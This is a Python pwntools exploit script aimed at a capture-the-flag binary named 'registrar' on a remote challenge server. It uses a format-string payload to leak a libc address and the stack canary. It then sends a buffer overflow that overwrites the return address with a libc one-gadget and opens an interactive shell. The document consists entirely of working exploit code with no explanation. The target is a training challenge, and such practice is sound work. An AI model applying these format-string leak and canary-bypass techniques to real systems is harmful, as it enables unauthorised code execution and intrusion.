#!/usr/bin/env python
from pwn import *
from functools import wraps
import itertools

context.log_level = 'debug'
e = ELF('./registrar')
r = None

def wrap(f):
    @wraps(f)
    def wrapped_f(*args, **kwargs):
        log.info('Called: ' + f.__name__ + repr(args))
        return f(*args, **kwargs)
    return wrapped_f

@wrap
def new_cust(name):
    r.sendline('N')
    r.sendline(name)
    r.recvuntil('Choice: ')

LOCAL = False

def main():
    global r
    env = { }
    if LOCAL:
        r = process('./registrar', env=env)
        gdb.attach(r, '''b *0x400b44
        c'''.format())
        OFFSET = 0x4f2c5
    else:
        r = remote("challenge.acictf.com", 59832)
        OFFSET = 0xf02a4

    print "1", r.recvuntil("name:")
    r.sendline("%3$lx_%19$lx_")
    print "2", r.recvuntil("name:")
    libc_addr = r.recvuntil("_")[:-1]
    print(libc_addr)
    if LOCAL:
        libc_base = int(libc_addr,16) - (0x7ffff7af4154 - 0x00007ffff79e4000)
    else:
        libc_base = int(libc_addr, 16) - (0x7ffff7b042c0 - 0x7ffff7a0d000)
    print(hex(libc_base))
    cookie = int(r.recvuntil("_")[:-1], 16)
    print(hex(cookie))

    payload = "A" * 0x48 + p64(cookie) + "Q" * 8 + p64(OFFSET + libc_base) + "\x00" * 0x80
    r.sendline(payload)

    r.interactive()

if __name__ == '__main__':
    main()
